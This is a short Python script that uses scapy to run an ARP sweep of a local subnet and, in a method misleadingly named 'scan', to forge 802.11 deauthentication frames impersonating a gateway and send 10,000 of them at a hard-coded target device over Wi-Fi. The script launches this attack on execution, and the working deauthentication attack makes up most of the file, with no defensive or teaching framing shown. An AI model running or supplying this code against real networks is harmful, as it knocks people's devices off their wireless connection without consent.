import sys
import scapy.all as scapy
import json


class Test:
    def airping(self, argv):
        return scapy.arping('192.168.1.243/24')

    def scan(self):
        target_mac = "28:cf:e9:1e:50:2d"
        gateway_mac = "0a:00:27:00:00:0e"
        # 802.11 frame
        # addr1: destination MAC
        # addr2: source MAC
        # addr3: Access Point MAC
        dot11 = scapy.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        # stack them up
        packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth()
        # send the packet
        scapy.sendp(packet, inter=0.2, count=10000, iface="Wi-Fi", verbose=1)


# export = getattr(Test(), sys.argv[1])
# export(sys.argv)

test = Test()
test.scan()
